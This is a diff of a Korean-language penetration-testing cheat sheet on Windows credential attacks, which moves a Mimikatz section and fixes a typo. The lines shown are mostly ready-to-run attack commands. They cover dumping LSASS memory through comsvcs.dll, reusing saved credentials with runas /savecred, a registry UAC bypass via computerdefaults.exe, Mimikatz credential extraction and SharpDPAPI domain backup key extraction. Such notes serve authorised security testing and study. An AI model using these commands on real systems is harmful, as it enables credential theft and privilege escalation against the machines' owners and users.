@@ -291,7 +291,15 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ## Attacking Windows Credential Manager
 ### cmdkey로 자격 증명 열거
 ```C:\>cmdkey /list```
-- SRV01\mcharles 사용자 가장 : ```C:\>runas /savecred /user:SRV01\mcharles cmd```
+- SRV01\mcharles 사용자로 가장 : ```C:\>runas /savecred /user:SRV01\mcharles cmd```
+
+### Mimikatz를 사용하여 자격 증명 추출
+```
+C:\Users\Administrator\Desktop> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::credman
+```
+- 저장된 자격 증명을 열거하고 추출하는 데 사용할 수 있는 다른 도구 : [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) , [DonPAPI](https://github.com/login-securite/DonPAPI) 등
 
 - UAC 우회(2가지 중 선택)
 ```
@@ -304,13 +312,6 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 > reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 ```
 
-### Mimikatz를 사용하여 자격 증명 추출
-```
-C:\Users\Administrator\Desktop> mimikatz.exe
-mimikatz # privilege::debug
-mimikatz # sekurlsa::credman
-```
-- 저장된 자격 증명을 열거하고 추출하는 데 사용할 수 있는 다른 도구 : [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) , [DonPAPI](https://github.com/login-securite/DonPAPI) 등
 ```
 # 도메인 백업 키 추출(Windows)
 .\SharpDPAPI.exe backupkey /nowrap
